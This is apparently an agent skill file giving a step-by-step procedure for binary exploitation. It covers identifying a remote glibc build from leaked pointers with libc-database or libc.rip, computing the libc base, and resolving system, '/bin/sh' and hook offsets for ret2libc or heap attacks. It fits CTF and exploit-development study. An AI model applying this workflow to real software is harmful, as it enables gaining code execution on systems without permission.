---
name: libc-identification
description: Identify the exact remote glibc build from one or more leaked runtime addresses (libc-database / libc.rip), compute the libc base, and resolve system/str_bin_sh/one_gadget offsets. Use immediately after leaking a libc pointer (GOT read via rop-chains, format-string %s leak, unsorted-bin fd leak) and before building the final ret2libc/one_gadget or heap-exploitation stage.
license: Apache-2.0
metadata:
  author: Section9Labs
---

# libc-identification

## Why this step exists

ASLR randomizes where libc is mapped, but the low 12 bits of every symbol
(the page offset) are fixed per *build*. Offsets of `system`, `"/bin/sh"`,
`__free_hook`, one_gadgets, etc. differ between every libc build
(2.27-3ubuntu1 vs 2.27-3ubuntu1.4 are different). So after you leak the
runtime address of any libc function, you must identify the exact build to
turn that one leak into every address you need:

```
libc_base = leaked_addr - offset_of_leaked_symbol_in_matched_libc
system    = libc_base + offset_system
binsh     = libc_base + offset_str_bin_sh
```

Sanity check: `libc_base` must end in `000` (page aligned). If it doesn't,
the build is wrong or the leak isn't what you think it is.

## Step 1 — Get a leak

Typical sources (sibling skills):
- `rop-chains`: `puts(puts@GOT)` / `printf` GOT read, then return to main.
- `format-string-exploitation`: `%s` at a GOT address, or a raw `%p` that
  lands on a `__libc_start_main`/`printf` return address on the stack.
- `heap-exploitation`: fd/bk of a freed unsorted-bin chunk points into
  `main_arena` (inside libc's data section).

Record the full leaked address, e.g. `puts = 0x7f3c6a4b85a0`.

## Step 2 — Identify the build with libc-database

```bash
git clone https://github.com/niklasb/libc-database
cd libc-database
./get ubuntu debian          # populate common distros; or ./get all (big)
./find puts 5a0              # match on last 3 hex digits (the fixed page offset)
```

Output lines look like:

```
ubuntu-glibc (id libc6_2.27-3ubuntu1_amd64)
ubuntu-glibc (id libc6_2.27-3ubuntu1.4_amd64)
```

Multiple candidates? Narrow with a second symbol in the SAME invocation:

```bash
./find puts 5a0 printf 710
```

Two independent symbols almost always pin a unique build. When you have one
match, dump its offsets:

```bash
./dump libc6_2.27-3ubuntu1.4_amd64
# offset___libc_start_main_ret = 0x21b97
# offset_system = 0x4f4e0
# offset_dup2 = 0x110ab0
# offset_str_bin_sh = 0x1b40fa
./dump libc6_2.27-3ubuntu1.4_amd64 puts system str_bin_sh __free_hook environ
```

Already hold the target's libc file (looted or shipped)? Index it so `find`
and `dump` know it: `./add ./libc.so.6`. Full command reference, downloading
the matched `.so` for one_gadget, and the symbol-stripping caveats:
`references/libc-database.md`.

## Step 2b — The web service (libc.rip / libc.blukat.me)

No local database? Query https://libc.rip (API) or https://libc.blukat.me
(same engine) by `symbol: last-3-hex-digits` pairs:

```bash
curl -s https://libc.rip/api/find -H 'Content-Type: application/json' \
  -d '{"symbols": {"puts": "5a0", "printf": "710"}}'
```

The JSON response lists candidate builds with `symbols` offsets inline and a
`download_url` for the exact `.so` (feed that file to `one_gadget` and
`./add`). When you have two leaks, always submit both in one query —
intersecting candidate sets manually is error-prone.

## Step 3 — Compute and verify the base

```python
libc_base = leak_puts - 0x0809c0          # offset_puts from dump
assert libc_base & 0xfff == 0             # must be page aligned
system  = libc_base + 0x04f4e0
binsh   = libc_base + 0x1b40fa
```

Hand these to:
- `rop-chains` — `pop rdi; ret` → `binsh` → `ret` (stack alignment) →
  `system`, or try `one_gadget ./libc.so.6` constraints against the
  downloaded build.
- `heap-exploitation` — hook/FSOP targets (`__free_hook` pre-2.34,
  `_IO_list_all` / exit handlers post-2.34) are all `libc_base + offset`.
- `pwntools` — `libc = ELF('./downloaded-libc.so.6'); libc.address = libc_base`
  then use `libc.symbols[...]` everywhere.

## Step 4 — When the target ships its own libc, skip identification

CTF handouts and firmware rootfs images give you the exact `libc.so.6`.
Don't identify — load it:

```python
from pwn import ELF
libc = ELF('./libc.so.6')
libc.address = leak_puts - libc.symbols['puts']
system = libc.symbols['system']
binsh  = next(libc.search(b'/bin/sh\x00'))
```

To RUN the target binary against that libc locally (debugging the real
allocator behavior matters for `heap-exploitation`), you must pair it with a
matching loader. `LD_PRELOAD` alone breaks when loader and libc versions
mismatch. Use `patchelf --set-interpreter ./ld-2.27.so --replace-needed
libc.so.6 ./libc.so.6 ./target` or pwninit. Full recipes:
`references/running-with-a-given-libc.md`.

## Helper script

```bash
python3 scripts/libc_id.py puts=0x7f3c6a4b85a0 printf=0x7f3c6a48e710
python3 scripts/libc_id.py puts=5a0                  # last-3-digits form also accepted
```

- Finds a libc-database clone at `$LIBC_DATABASE` or `./libc-database`
  (also `~/libc-database`) and runs `./find` with the page-offset digits.
- No clone present → prints the exact `curl` query for libc.rip and exits
  cleanly.
- Exactly one candidate → runs `./dump`, prints `offset_system`,
  `offset_str_bin_sh`, `offset_puts` (plus your queried symbols), and — if
  you gave full addresses — the computed `libc_base` and absolute addresses.
- Writes rupu work units to `libc-id-work-units.json` (one unit per
  candidate build; hints name the next skill: `rop-chains` /
  `heap-exploitation`). Wiring: `references/rupu.md`.

## Pitfalls

- Leaked a GOT entry *before* the function was ever called (lazy binding,
  no `BIND_NOW`)? You leaked a PLT stub / loader address, not libc. Call the
  function once first, or leak a different symbol.
- `__libc_start_main_ret` leaks (stack reads) match against the
  `__libc_start_main_ret` pseudo-symbol in libc-database — query it by that
  name, not `__libc_start_main`.
- Dozens of candidates sharing offsets usually ARE compatible for
  system/str_bin_sh — `./dump` a few and compare; if the offsets you need
  agree, any of them works.
- i386 targets: still 3 hex digits, but remember addresses are 32-bit when
  computing the base.
